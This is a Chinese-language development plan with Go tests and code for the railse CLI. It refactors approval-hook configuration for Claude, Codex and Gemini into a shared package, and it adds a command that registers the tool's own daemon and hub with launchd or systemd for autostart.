- [ ] **Step 1: 搬代码与写失败的测试**

把 `cmd/railse/setup.go` 里 `hookEntry`、`hookGroup`、`strp`、`shellQuote`、`hookPlan`、`isOurs`、`withoutOurs`、`hookCommandProgram`、`mergeHooks` 原样搬到 `internal/hooksconf/hooksconf.go`，按接口段改名导出；`cmd/railse/setup_test.go` 里直接测这些函数的用例搬到 `internal/hooksconf/hooksconf_test.go`（包名 `hooksconf`，函数名对应改）。然后在 `hooksconf_test.go` 追加：
```go
func TestInspectAndExpected(t *testing.T) {
	bin := "/usr/local/bin/railse"
	doc, err := Merge(nil, bin, Plan("claude", bin))
	if err != nil {
		t.Fatal(err)
	}
	ins, err := Inspect(doc, bin)
	if err != nil {
		t.Fatal(err)
	}
	for ev, minTimeout := range Expected("claude") {
		st := ins.Events[ev]
		if !st.Present || st.Timeout < minTimeout || st.Program != bin {
			t.Fatalf("%s: %+v（要求超时 ≥ %d）", ev, st, minTimeout)
		}
	}
	// 别人的条目不算
	other := []byte(`{"hooks":{"PermissionRequest":[{"hooks":[{"type":"command","command":"/opt/x hook claude","timeout":60}]}]}}`)
	ins, _ = Inspect(other, bin)
	if ins.Events["PermissionRequest"].Present {
		t.Fatal("别的程序的条目不应算作已安装")
	}
	// bin 为空时按程序文件名 railse 认（换过安装路径）
	ins, _ = Inspect([]byte(`{"hooks":{"PermissionRequest":[{"hooks":[{"type":"command","command":"/old/railse hook claude","timeout":86400}]}]}}`), "")
	if !ins.Events["PermissionRequest"].Present || ins.Events["PermissionRequest"].Program != "/old/railse" {
		t.Fatalf("按文件名识别: %+v", ins.Events["PermissionRequest"])
	}
	if _, err := Inspect([]byte("{bad"), bin); err == nil {
		t.Fatal("坏 JSON 应报错")
	}
	if Expected("gemini")["BeforeTool"] != 86400000 || Expected("codex")["PermissionRequest"] != 86400 {
		t.Fatalf("Expected: %v %v", Expected("gemini"), Expected("codex"))
	}
}

func TestMergeRemoveOnly(t *testing.T) {
	bin := "/usr/local/bin/railse"
	doc, _ := Merge([]byte(`{"permissions":{"allow":["Bash"]}}`), bin, Plan("claude", bin))
	out, err := Merge(doc, bin, nil)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(out), "railse") || strings.Contains(string(out), `"hooks"`) || !strings.Contains(string(out), `"permissions"`) {
		t.Fatalf("只删我们的条目后: %s", out)
	}
}

func TestPaths(t *testing.T) {
	local, shared := ClaudePaths("/p")
	if local != "/p/.claude/settings.local.json" || shared != "/p/.claude/settings.json" || GeminiPath("/p") != "/p/.gemini/settings.json" || CodexPath("/h") != "/h/.codex/hooks.json" {
		t.Fatal("路径不对")
	}
}
```

`cmd/railse/setup_test.go` 追加（命令级）：
```go
func TestSetupHooksWritesLocalAndMigratesShared(t *testing.T) {
	dir, _ := os.MkdirTemp("", "rs")
	defer os.RemoveAll(dir)
	proj := filepath.Join(dir, "proj")
	os.MkdirAll(filepath.Join(proj, ".claude"), 0o755)
	bin := filepath.Join(dir, "railse")
	// 旧版 setup 写进 settings.json 的条目，加一条别人的
	old, _ := hooksconf.Merge([]byte(`{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"/opt/x","timeout":5}]}]}}`), bin, hooksconf.Plan("claude", bin))
	os.WriteFile(filepath.Join(proj, ".claude", "settings.json"), old, 0o644)
	var out, errOut bytes.Buffer
	if code := run([]string{"setup", "hooks", "--project", proj, "--claude", "--bin", bin}, &out, &errOut); code != 0 {
		t.Fatalf("setup: %d %s", code, errOut.String())
	}
	local, _ := os.ReadFile(filepath.Join(proj, ".claude", "settings.local.json"))
	ins, _ := hooksconf.Inspect(local, bin)
	if !ins.Events["PermissionRequest"].Present {
		t.Fatalf("settings.local.json 应有钩子: %s", local)
	}
	shared, _ := os.ReadFile(filepath.Join(proj, ".claude", "settings.json"))
	ins2, _ := hooksconf.Inspect(shared, bin)
	if ins2.Events["PermissionRequest"].Present || !strings.Contains(string(shared), "/opt/x") {
		t.Fatalf("settings.json 应只剩别人的条目: %s", shared)
	}
	if !strings.Contains(out.String(), "迁走") {
		t.Fatalf("应提示迁移: %q", out.String())
	}
	// 再跑一次幂等
	out.Reset()
	run([]string{"setup", "hooks", "--project", proj, "--claude", "--bin", bin}, &out, &errOut)
	if strings.Contains(out.String(), "迁走") {
		t.Fatal("第二次不应再提示迁移")
	}
}
```
（现有 `setup_test.go` 里断言写到 `.claude/settings.json` 的用例改为 `settings.local.json`。）

- [ ] **Step 2: 跑测试确认失败**

Run: `go build ./... && go test ./internal/hooksconf/ ./cmd/railse/ -run 'Inspect|MergeRemoveOnly|Paths|SetupHooks'`
Expected: 编译通过后 FAIL（`Inspect`、`Expected`、路径函数未定义；setup 仍写 `settings.json`）。

- [ ] **Step 3: 写实现**

`internal/hooksconf/hooksconf.go` 在搬来的代码之外加：
```go
// Expected 是每个 CLI 必须装的事件与各自的超时下限（秒；Gemini 是毫秒），与 Plan 写出的值一致。
func Expected(cli string) map[string]int {
	switch cli {
	case "claude":
		return map[string]int{"PermissionRequest": 86400, "Notification": 0, "Stop": 0, "SessionEnd": 0}
	case "codex":
		return map[string]int{"PermissionRequest": 86400, "Stop": 0, "SessionEnd": 0}
	case "gemini":
		return map[string]int{"BeforeTool": 86400000, "Notification": 0, "AfterAgent": 0, "SessionEnd": 0}
	}
	return nil
}

// EventState 是一个事件里我们的条目的状态。
type EventState struct {
	Present bool
	Timeout int
	Program string
}

// Installed 是一份钩子配置里我们的条目。
type Installed struct {
	Events map[string]EventState
}

// Inspect 读一份钩子配置，报告每个事件里有没有我们的条目、超时与程序路径。bin 为空时按“程序文件名是 railse”认。
func Inspect(doc []byte, bin string) (Installed, error) {
	ins := Installed{Events: map[string]EventState{}}
	if len(bytes.TrimSpace(doc)) == 0 {
		return ins, nil
	}
	var v any
	dec := json.NewDecoder(bytes.NewReader(doc))
	dec.UseNumber()
	if err := dec.Decode(&v); err != nil {
		return ins, fmt.Errorf("不是合法 JSON: %w", err)
	}
	top, _ := v.(map[string]any)
	hooks, _ := top["hooks"].(map[string]any)
	for ev, raw := range hooks {
		groups, _ := raw.([]any)
		for _, g := range groups {
			gm, _ := g.(map[string]any)
			list, _ := gm["hooks"].([]any)
			for _, e := range list {
				if !ours(e, bin) {
					continue
				}
				em := e.(map[string]any)
				st := EventState{Present: true}
				if cmd, _ := em["command"].(string); cmd != "" {
					st.Program, _ = CommandProgram(cmd)
				}
				if n, ok := em["timeout"].(json.Number); ok {
					t, _ := n.Int64()
					st.Timeout = int(t)
				}
				ins.Events[ev] = st
			}
		}
	}
	return ins, nil
}

// ours 同 IsOurs，但 bin 为空时只按名字前缀或程序文件名认。
func ours(entry any, bin string) bool {
	if bin != "" {
		return IsOurs(entry, bin)
	}
	m, ok := entry.(map[string]any)
	if !ok {
		return false
	}
	name, _ := m["name"].(string)
	cmd, _ := m["command"].(string)
	if strings.HasPrefix(name, "railse-") {
		return true
	}
	prog, ok := CommandProgram(cmd)
	return ok && filepath.Base(prog) == "railse"
}

// ClaudePaths 返回项目级的本机配置与共享配置：钩子写进 settings.local.json（不入库），settings.json 里只做清理。
func ClaudePaths(project string) (local, shared string) {
	return filepath.Join(project, ".claude", "settings.local.json"), filepath.Join(project, ".claude", "settings.json")
}

// GeminiPath 是 Gemini 的项目级配置。
func GeminiPath(project string) string { return filepath.Join(project, ".gemini", "settings.json") }

// CodexPath 是 Codex 的用户级钩子文件。
func CodexPath(home string) string { return filepath.Join(home, ".codex", "hooks.json") }
```
`Merge` 在 `entries == nil` 且删完后 `hooks` 为空时 `delete(doc, "hooks")`。

`cmd/railse/setup.go`：
- 删掉搬走的类型与函数，改调 `hooksconf.Plan`、`hooksconf.Merge`、`hooksconf.ShellQuote`。
- `targets` 里 Claude 的路径改为 `hooksconf.ClaudePaths(absProject)` 的 `local`；另加一个“只清理”的目标：`shared` 存在且 `hooksconf.Inspect` 发现我们的条目时，`Merge(existing, bin, nil)` 写回并打印“已从 %s 迁走 Railse 钩子（现在写在 settings.local.json，不入库）”。
- 用法文本：“Claude 写项目级 `.claude/settings.local.json`（不入库；旧版写在 settings.json 的会迁走）”。

`docs/agent-local-loop.md`：钩子位置改为 `settings.local.json` 并说明迁移。设计文档 §0.6 那一行“待改：Claude 的钩子改写到 `.claude/settings.local.json`，放到第 5 份计划”改为“已改（2026-10-24，第 5 份）”。

- [ ] **Step 4: 跑测试确认通过**

Run: `make test && scripts/smoke-claude.sh`
Expected: 全过；冒烟脚本仍 OK（`claude -p … --setting-sources project` 会读 `settings.local.json`；若实测不读，把脚本改为 `--setting-sources project,local` 并在 docs 里注明）。

- [ ] **Step 5: 提交**

```bash
git add internal/hooksconf cmd/railse/setup.go cmd/railse/setup_test.go docs/agent-local-loop.md docs/superpowers/specs/2026-10-21-railse-opc-design.md scripts/smoke-claude.sh
git commit -m "refactor(setup): 钩子配置抽成 internal/hooksconf；Claude 钩子写 settings.local.json 并从 settings.json 迁走"
```

---

### Task 5: `railse setup autostart`：launchd 与 systemd 托管守护进程和 hub

**Files:**
- Create: `cmd/railse/autostart.go`
- Create: `cmd/railse/autostart_test.go`
- Modify: `cmd/railse/setup.go`（分发 `autostart`；用法文本）

**Interfaces:**
- 命令：`railse setup autostart [--hub] [--uninstall] [--status] [--dir 目录] [--bin 路径] [--system] [--user 名字] [--dry-run] [-- run 的额外参数]`
  - 默认托管守护进程（`agent run`）；`--hub` 托管 hub（`hub run`），`--` 之后的参数原样追加到 `run` 后面（例如 `-- --acme-domain hub.example.com --acme-email me@example.com`）
  - macOS：写 `~/Library/LaunchAgents/dev.railse.<agent|hub>.plist`（0644），`launchctl bootout gui/<uid>/<label>`（忽略失败）后 `launchctl bootstrap gui/<uid> <plist>`；`--uninstall` 先 `bootout` 再删文件；`--status` 跑 `launchctl print gui/<uid>/<label>`，退出 0 即在跑
  - Linux 用户单元：写 `~/.config/systemd/user/railse-<agent|hub>.service`（0644），`systemctl --user daemon-reload`、`systemctl --user enable --now railse-<kind>`；卸载 `disable --now`、删文件、`daemon-reload`；状态 `systemctl --user is-active railse-<kind>`；安装后提示 `loginctl enable-linger $USER`（无人登录时也要跑）
  - Linux 系统单元（`--system`，须 root）：写 `/etc/systemd/system/railse-<kind>.service`，`User=`（`--user`，默认 `$SUDO_USER`，没有则报错）、`AmbientCapabilities=CAP_NET_BIND_SERVICE`（hub 直出 443/80 用）、`NoNewPrivileges=true`、`ProtectSystem=strict`、`ReadWritePaths=<数据目录>`；`systemctl daemon-reload`、`enable --now`
  - 其他系统：报错“只支持 macOS 与 Linux”，退出 1
  - `--dry-run` 只打印将写的文件内容与将执行的命令
- 包内：
  - `type autostartSpec struct{ Kind, Bin, Dir, Home, User string; UID int; System bool; Extra []string }`
  - `func launchdLabel(kind string) string`、`func launchdPlistPath(home, kind string) string`、`func launchdPlist(sp autostartSpec) []byte`
  - `func systemdUnitPath(home, kind string, system bool) string`、`func systemdUnit(sp autostartSpec) []byte`、`func systemdQuote(s string) string`
  - `var runCommand = func(name string, args ...string) (string, error)`（`exec.Command` 合并输出；测试替换）
  - `func runAutostart(args []string, stdout, stderr io.Writer) int`（由 `runSetup` 分发）；`goos` 取 `runtime.GOOS`，但生成函数都接受 `goos` 参数以便测试两种系统

- [ ] **Step 1: 写失败的测试**

`cmd/railse/autostart_test.go`:
```go
package main

import (
	"bytes"
	"encoding/xml"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

type cmdRec struct{ calls [][]string }

func (r *cmdRec) run(name string, args ...string) (string, error) {
	r.calls = append(r.calls, append([]string{name}, args...))
	return "", nil
}

func TestLaunchdPlistIsWellFormed(t *testing.T) {
	sp := autostartSpec{Kind: "agent", Bin: "/usr/local/bin/railse", Dir: "/Users/u/.railse", Home: "/Users/u", UID: 501}
	b := launchdPlist(sp)
	var v struct {
		XMLName xml.Name `xml:"plist"`
	}
	if err := xml.Unmarshal(b, &v); err != nil {
		t.Fatalf("不是合法 XML: %v\n%s", err, b)
	}
	for _, want := range []string{"<string>dev.railse.agent</string>", "<string>/usr/local/bin/railse</string>", "<string>agent</string>", "<string>run</string>",
		"<key>RAILSE_HOME</key><string>/Users/u/.railse</string>", "<key>KeepAlive</key><true/>", "<key>RunAtLoad</key><true/>", "/Users/u/.railse/launchd.log"} {
		if !strings.Contains(string(b), want) {
			t.Errorf("plist 缺 %s:\n%s", want, b)
		}
	}
	// 路径里的特殊字符要转义
	sp2 := sp
	sp2.Bin = "/Users/u/My <Apps>/railse"
	if b2 := string(launchdPlist(sp2)); !strings.Contains(b2, "/Users/u/My &lt;Apps&gt;/railse") {
		t.Fatalf("应转义: %s", b2)
	}
	hub := autostartSpec{Kind: "hub", Bin: "/usr/local/bin/railse", Dir: "/Users/u/.railse-hub", Home: "/Users/u", UID: 501, Extra: []string{"--public-url", "https://hub.example.com"}}
	if b3 := string(launchdPlist(hub)); !strings.Contains(b3, "<string>hub</string>") || !strings.Contains(b3, "<key>RAILSE_HUB_HOME</key>") || !strings.Contains(b3, "<string>--public-url</string><string>https://hub.example.com</string>") {
		t.Fatalf("hub plist: %s", b3)
	}
}

func TestSystemdUnit(t *testing.T) {
	sp := autostartSpec{Kind: "agent", Bin: "/usr/local/bin/railse", Dir: "/home/u/.railse", Home: "/home/u"}
	u := string(systemdUnit(sp))
	for _, want := range []string{"ExecStart=/usr/local/bin/railse agent run", "Environment=RAILSE_HOME=/home/u/.railse", "Restart=always", "WantedBy=default.target"} {
		if !strings.Contains(u, want) {
			t.Errorf("用户单元缺 %s:\n%s", want, u)
		}
	}
	if strings.Contains(u, "AmbientCapabilities") || strings.Contains(u, "User=") {
		t.Fatal("用户单元不该有系统单元的字段")
	}
	sys := autostartSpec{Kind: "hub", Bin: "/usr/local/bin/railse", Dir: "/var/lib/railse-hub", Home: "/root", System: true, User: "railse", Extra: []string{"--acme-domain", "hub.example.com"}}
	s := string(systemdUnit(sys))
	for _, want := range []string{"ExecStart=/usr/local/bin/railse hub run --acme-domain hub.example.com", "Environment=RAILSE_HUB_HOME=/var/lib/railse-hub", "User=railse",
		"AmbientCapabilities=CAP_NET_BIND_SERVICE", "NoNewPrivileges=true", "ProtectSystem=strict", "ReadWritePaths=/var/lib/railse-hub", "WantedBy=multi-user.target"} {
		if !strings.Contains(s, want) {
			t.Errorf("系统单元缺 %s:\n%s", want, s)
		}
	}
	if systemdQuote("/a b/railse") != `"/a b/railse"` || systemdQuote("/plain") != "/plain" {
		t.Fatal("systemdQuote")
	}
}

func TestAutostartInstallUninstallStatus(t *testing.T) {
	home, _ := os.MkdirTemp("", "rs")
	defer os.RemoveAll(home)
	t.Setenv("HOME", home)
	rec := &cmdRec{}
	old := runCommand
	runCommand = rec.run
	defer func() { runCommand = old }()
	bin := filepath.Join(home, "railse")
	var out, errOut bytes.Buffer
	// macOS 路径
	code := runAutostartOS("darwin", 501, []string{"--dir", filepath.Join(home, ".railse"), "--bin", bin}, &out, &errOut)
	if code != 0 {
		t.Fatalf("install: %d %s", code, errOut.String())
	}
	plist := filepath.Join(home, "Library", "LaunchAgents", "dev.railse.agent.plist")
	if _, err := os.Stat(plist); err != nil {
		t.Fatalf("plist 未写: %v", err)
	}
	if len(rec.calls) != 2 || rec.calls[0][0] != "launchctl" || rec.calls[0][1] != "bootout" || rec.calls[1][1] != "bootstrap" || rec.calls[1][2] != "gui/501" {
		t.Fatalf("launchctl 调用: %v", rec.calls)
	}
	rec.calls = nil
	out.Reset()
	if code := runAutostartOS("darwin", 501, []string{"--status"}, &out, &errOut); code != 0 || rec.calls[0][1] != "print" {
		t.Fatalf("status: %d %v", code, rec.calls)
	}
	rec.calls = nil
	if code := runAutostartOS("darwin", 501, []string{"--uninstall"}, &out, &errOut); code != 0 {
		t.Fatalf("uninstall: %d %s", code, errOut.String())
	}
	if _, err := os.Stat(plist); !os.IsNotExist(err) || rec.calls[0][1] != "bootout" {
		t.Fatalf("卸载后 plist 应删除且先 bootout: %v %v", err, rec.calls)
	}
	// Linux 用户单元
	rec.calls = nil
	if code := runAutostartOS("linux", 1000, []string{"--hub", "--dir", filepath.Join(home, ".railse-hub"), "--bin", bin, "--", "--public-url", "https://hub.example.com"}, &out, &errOut); code != 0 {
		t.Fatalf("linux install: %d %s", code, errOut.String())
	}
	unit := filepath.Join(home, ".config", "systemd", "user", "railse-hub.service")
	b, err := os.ReadFile(unit)
	if err != nil || !strings.Contains(string(b), "hub run --public-url https://hub.example.com") {
		t.Fatalf("unit: %v %s", err, b)
	}
	if len(rec.calls) != 2 || rec.calls[0][1] != "--user" || rec.calls[0][2] != "daemon-reload" || rec.calls[1][2] != "enable" || rec.calls[1][3] != "--now" {
		t.Fatalf("systemctl 调用: %v", rec.calls)
	}
	if !strings.Contains(out.String(), "enable-linger") {
		t.Fatal("应提示 loginctl enable-linger")
	}
	// dry-run 不写不跑
	rec.calls = nil
	out.Reset()
	os.Remove(unit)
	if code := runAutostartOS("linux", 1000, []string{"--dry-run", "--bin", bin}, &out, &errOut); code != 0 || len(rec.calls) != 0 || !strings.Contains(out.String(), "ExecStart=") {
		t.Fatalf("dry-run: %d %v %q", code, rec.calls, out.String())
	}
	if _, err := os.Stat(filepath.Join(home, ".config", "systemd", "user", "railse-agent.service")); !os.IsNotExist(err) {
		t.Fatal("dry-run 不应写文件")
	}
	// --system 非 root 拒绝
	if code := runAutostartOS("linux", 1000, []string{"--system", "--hub", "--bin", bin}, &out, &errOut); code == 0 || !strings.Contains(errOut.String(), "root") {
		t.Fatalf("非 root 的 --system: %d %q", code, errOut.String())
	}
	// 不支持的系统
	if code := runAutostartOS("windows", 0, nil, &out, &errOut); code != 1 {
		t.Fatalf("windows: %d", code)
	}
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./cmd/railse/ -run 'Launchd|Systemd|AutostartInstall'`
Expected: FAIL，函数未定义。

- [ ] **Step 3: 写实现**

`cmd/railse/autostart.go`:
```go
package main

import (
	"bytes"
	"encoding/xml"
	"errors"
	"flag"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

const autostartUsage = `用法:
  railse setup autostart [--hub] [--uninstall] [--status] [--dir 目录] [--bin 路径] [--system] [--user 名字] [--dry-run] [-- run 的额外参数]
    默认托管守护进程（agent run）；--hub 托管 hub（hub run），-- 之后的参数原样追加，例如：
      railse setup autostart --hub -- --acme-domain hub.example.com --acme-email me@example.com
    macOS 写 ~/Library/LaunchAgents/dev.railse.<agent|hub>.plist（launchd 用户代理）；
    Linux 写 ~/.config/systemd/user/railse-<agent|hub>.service；--system（须 root）写 /etc/systemd/system，hub 直出 443/80 时用它。`

// autostartSpec 描述要托管的进程。
type autostartSpec struct {
	Kind   string   // agent 或 hub
	Bin    string   // 可执行文件绝对路径
	Dir    string   // 数据目录；写进 RAILSE_HOME 或 RAILSE_HUB_HOME
	Home   string   // 家目录
	User   string   // 系统单元的 User=
	UID    int      // launchd 的 gui/<uid>
	System bool     // Linux 系统单元
	Extra  []string // 追加到 run 后面的参数
}

// runCommand 跑系统命令并合并输出。是变量只为测试能替换。
var runCommand = func(name string, args ...string) (string, error) {
	out, err := exec.Command(name, args...).CombinedOutput()
	return string(out), err
}

func launchdLabel(kind string) string { return "dev.railse." + kind }

func launchdPlistPath(home, kind string) string {
	return filepath.Join(home, "Library", "LaunchAgents", launchdLabel(kind)+".plist")
}

func systemdUnitPath(home, kind string, system bool) string {
	if system {
		return filepath.Join("/etc/systemd/system", "railse-"+kind+".service")
	}
	return filepath.Join(home, ".config", "systemd", "user", "railse-"+kind+".service")
}

func (sp autostartSpec) envName() string {
	if sp.Kind == "hub" {
		return "RAILSE_HUB_HOME"
	}
	return "RAILSE_HOME"
}

func (sp autostartSpec) args() []string {
	return append([]string{sp.Kind, "run"}, sp.Extra...)
}

func xmlEscape(s string) string {
	var b bytes.Buffer
	xml.EscapeText(&b, []byte(s))
	return b.String()
}

// launchdPlist 生成 launchd 用户代理：开机（登录）即起、退出即拉起、5 秒节流，标准输出与错误写进数据目录的 launchd.log。
// PATH 给足常见位置：守护进程本身不需要，但 hub 的 ACME 与 agent 的子进程都可能用到系统工具。
func launchdPlist(sp autostartSpec) []byte {
	var b strings.Builder
	b.WriteString("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\"><dict>\n")
	fmt.Fprintf(&b, "  <key>Label</key><string>%s</string>\n", launchdLabel(sp.Kind))
	b.WriteString("  <key>ProgramArguments</key><array>")
	fmt.Fprintf(&b, "<string>%s</string>", xmlEscape(sp.Bin))
	for _, a := range sp.args() {
		fmt.Fprintf(&b, "<string>%s</string>", xmlEscape(a))
	}
	b.WriteString("</array>\n")
	fmt.Fprintf(&b, "  <key>EnvironmentVariables</key><dict><key>%s</key><string>%s</string><key>PATH</key><string>/usr/local/bin:/opt/homebrew/bin:/usr/bin:/bin</string></dict>\n", sp.envName(), xmlEscape(sp.Dir))
	b.WriteString("  <key>RunAtLoad</key><true/>\n  <key>KeepAlive</key><true/>\n  <key>ThrottleInterval</key><integer>5</integer>\n")
	logPath := xmlEscape(filepath.Join(sp.Dir, "launchd.log"))
	fmt.Fprintf(&b, "  <key>StandardOutPath</key><string>%s</string>\n  <key>StandardErrorPath</key><string>%s</string>\n", logPath, logPath)
	fmt.Fprintf(&b, "  <key>WorkingDirectory</key><string>%s</string>\n", xmlEscape(sp.Home))
	b.WriteString("</dict></plist>\n")
	return []byte(b.String())
}

// systemdQuote 给 ExecStart 的参数加引号：含空白或引号时用双引号包起来并转义。
func systemdQuote(s string) string {
	if s != "" && !strings.ContainsAny(s, " \t\"'\\") {
		return s
	}
	return `"` + strings.NewReplacer(`\`, `\\`, `"`, `\"`).Replace(s) + `"`
}

// systemdUnit 生成用户单元或系统单元。系统单元加最小权限：指定用户、只允许绑定特权端口、文件系统只读、数据目录可写。
func systemdUnit(sp autostartSpec) []byte {
	var b strings.Builder
	title := "Railse agent（审批守护进程）"
	if sp.Kind == "hub" {
		title = "Railse hub（审批中心）"
	}
	fmt.Fprintf(&b, "[Unit]\nDescription=%s\nAfter=network-online.target\nWants=network-online.target\n\n[Service]\n", title)
	parts := []string{systemdQuote(sp.Bin)}
	for _, a := range sp.args() {
		parts = append(parts, systemdQuote(a))
	}
	fmt.Fprintf(&b, "ExecStart=%s\n", strings.Join(parts, " "))
	fmt.Fprintf(&b, "Environment=%s=%s\n", sp.envName(), systemdQuote(sp.Dir))
	b.WriteString("Restart=always\nRestartSec=2\n")
	if sp.System {
		fmt.Fprintf(&b, "User=%s\nAmbientCapabilities=CAP_NET_BIND_SERVICE\nNoNewPrivileges=true\nProtectSystem=strict\nProtectHome=read-only\nReadWritePaths=%s\n", sp.User, systemdQuote(sp.Dir))
		b.WriteString("\n[Install]\nWantedBy=multi-user.target\n")
	} else {
		b.WriteString("\n[Install]\nWantedBy=default.target\n")
	}
	return []byte(b.String())
}

// runAutostart 是 railse setup autostart：按当前系统与用户分发。
func runAutostart(args []string, stdout, stderr io.Writer) int {
	return runAutostartOS(runtime.GOOS, os.Getuid(), args, stdout, stderr)
}

// runAutostartOS 是 runAutostart 的可测版本：系统与 uid 由调用方给。
func runAutostartOS(goos string, uid int, args []string, stdout, stderr io.Writer) int {
	fs := flag.NewFlagSet("setup autostart", flag.ContinueOnError)
	fs.SetOutput(stderr)
	hubMode := fs.Bool("hub", false, "托管 hub 而不是守护进程")
	uninstall := fs.Bool("uninstall", false, "停止并移除托管")
	status := fs.Bool("status", false, "只查看托管状态")
	dir := fs.String("dir", "", "数据目录，默认 $RAILSE_HOME/~/.railse 或 $RAILSE_HUB_HOME/~/.railse-hub")
	bin := fs.String("bin", "", "railse 可执行文件路径，默认当前程序")
	system := fs.Bool("system", false, "Linux：写系统单元（须 root）")
	user := fs.String("user", "", "系统单元以哪个用户运行，默认 $SUDO_USER")
	dryRun := fs.Bool("dry-run", false, "只打印不写不跑")
	if err := fs.Parse(args); err != nil {
		return 2
	}
	if goos != "darwin" && goos != "linux" {
		fmt.Fprintln(stderr, "开机自启只支持 macOS（launchd）与 Linux（systemd）")
		return 1
	}
	home, err := os.UserHomeDir()
	if err != nil {
		fmt.Fprintln(stderr, err)
		return 1
	}
	sp := autostartSpec{Kind: "agent", Bin: *bin, Dir: *dir, Home: home, UID: uid, System: *system, User: *user, Extra: fs.Args()}
	if *hubMode {
		sp.Kind = "hub"
	}
	if sp.Bin == "" {
		exe, err := os.Executable()
		if err != nil {
			fmt.Fprintln(stderr, err)
			return 1
		}
		sp.Bin, _ = filepath.Abs(exe)
	}
	if sp.Dir == "" {
		if sp.Kind == "hub" {
			sp.Dir, err = defaultHubDir()
		} else {
			var c = agentDefaultDir
			sp.Dir, err = c()
		}
		if err != nil {
			fmt.Fprintln(stderr, err)
			return 1
		}
	}
	if sp.System {
		if goos != "linux" {
			fmt.Fprintln(stderr, "--system 只在 Linux 上有效")
			return 2
		}
		if uid != 0 {
			fmt.Fprintln(stderr, "--system 要以 root 运行（sudo railse setup autostart --system …）")
			return 1
		}
		if sp.User == "" {
			sp.User = os.Getenv("SUDO_USER")
		}
		if sp.User == "" || sp.User == "root" {
			fmt.Fprintln(stderr, "--system 需要 --user 指定运行用户（不建议 root）")
			return 2
		}
	}
	switch {
	case *status:
		return autostartStatus(goos, sp, stdout, stderr)
	case *uninstall:
		return autostartUninstall(goos, sp, *dryRun, stdout, stderr)
	default:
		return autostartInstall(goos, sp, *dryRun, stdout, stderr)
	}
}

// agentDefaultDir 取守护进程数据目录，是变量只为测试能替换。
var agentDefaultDir = func() (string, error) {
	c, err := agentDefaultConfig()
	if err != nil {
		return "", err
	}
	return c.Dir, nil
}

func run2(dry bool, stdout io.Writer, name string, args ...string) error {
	if dry {
		fmt.Fprintf(stdout, "$ %s %s\n", name, strings.Join(args, " "))
		return nil
	}
	out, err := runCommand(name, args...)
	if err != nil {
		return fmt.Errorf("%s %s: %v\n%s", name, strings.Join(args, " "), err, strings.TrimSpace(out))
	}
	return nil
}

func autostartInstall(goos string, sp autostartSpec, dry bool, stdout, stderr io.Writer) int {
	var path string
	var content []byte
	if goos == "darwin" {
		path, content = launchdPlistPath(sp.Home, sp.Kind), launchdPlist(sp)
	} else {
		path, content = systemdUnitPath(sp.Home, sp.Kind, sp.System), systemdUnit(sp)
	}
	if dry {
		fmt.Fprintf(stdout, "== %s ==\n%s", path, content)
	} else {
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			fmt.Fprintln(stderr, err)
			return 1
		}
		if err := writeFileAtomic(path, content, 0o644); err != nil {
			fmt.Fprintln(stderr, err)
			return 1
		}
		fmt.Fprintf(stdout, "已写入 %s\n", path)
	}
	var err error
	if goos == "darwin" {
		target := fmt.Sprintf("gui/%d", sp.UID)
		_ = run2(dry, stdout, "launchctl", "bootout", target+"/"+launchdLabel(sp.Kind)) // 还没装过时会失败，忽略
		err = run2(dry, stdout, "launchctl", "bootstrap", target, path)
	} else {
		sc := systemctlArgs(sp.System)
		if err = run2(dry, stdout, "systemctl", append(sc, "daemon-reload")...); err == nil {
			err = run2(dry, stdout, "systemctl", append(sc, "enable", "--now", "railse-"+sp.Kind)...)
		}
	}
	if err != nil {
		fmt.Fprintln(stderr, err)
		return 1
	}
	if goos == "linux" && !sp.System {
		fmt.Fprintln(stdout, "提示：无人登录时也要跑的话，执行 loginctl enable-linger $USER")
	}
	fmt.Fprintf(stdout, "已托管 %s；查看状态：railse setup autostart %s--status\n", sp.Kind, map[bool]string{true: "--hub ", false: ""}[sp.Kind == "hub"])
	return 0
}

func systemctlArgs(system bool) []string {
	if system {
		return nil
	}
	return []string{"--user"}
}

func autostartUninstall(goos string, sp autostartSpec, dry bool, stdout, stderr io.Writer) int {
	var path string
	var err error
	if goos == "darwin" {
		path = launchdPlistPath(sp.Home, sp.Kind)
		_ = run2(dry, stdout, "launchctl", "bootout", fmt.Sprintf("gui/%d/%s", sp.UID, launchdLabel(sp.Kind)))
	} else {
		path = systemdUnitPath(sp.Home, sp.Kind, sp.System)
		sc := systemctlArgs(sp.System)
		_ = run2(dry, stdout, "systemctl", append(sc, "disable", "--now", "railse-"+sp.Kind)...)
	}
	if !dry {
		if err = os.Remove(path); err != nil && !errors.Is(err, os.ErrNotExist) {
			fmt.Fprintln(stderr, err)
			return 1
		}
	}
	if goos == "linux" {
		_ = run2(dry, stdout, "systemctl", append(systemctlArgs(sp.System), "daemon-reload")...)
	}
	fmt.Fprintf(stdout, "已移除 %s 的托管（%s）\n", sp.Kind, path)
	return 0
}

func autostartStatus(goos string, sp autostartSpec, stdout, stderr io.Writer) int {
	var out string
	var err error
	if goos == "darwin" {
		out, err = runCommand("launchctl", "print", fmt.Sprintf("gui/%d/%s", sp.UID, launchdLabel(sp.Kind)))
	} else {
		out, err = runCommand("systemctl", append(systemctlArgs(sp.System), "is-active", "railse-"+sp.Kind)...)
	}
	if err != nil {
		fmt.Fprintf(stdout, "%s 未托管或未在跑\n", sp.Kind)
		if strings.TrimSpace(out) != "" {
			fmt.Fprintln(stderr, strings.TrimSpace(out))
		}
		return 1
	}
	fmt.Fprintf(stdout, "%s 已托管并在跑\n", sp.Kind)
	return 0
}
```
（`agentDefaultConfig` 是 `agent.DefaultConfig` 的变量包装，若 `agent.go` 里没有就加：`var agentDefaultConfig = agent.DefaultConfig`；`writeFileAtomic` 是 `setup.go` 已有的。）

`cmd/railse/setup.go` 的 `runSetup`：`args[0]` 为 `autostart` 时 `return runAutostart(args[1:], stdout, stderr)`；`setupUsage` 加 `autostartUsage` 的第一行。

- [ ] **Step 4: 跑测试确认通过**

Run: `make test`
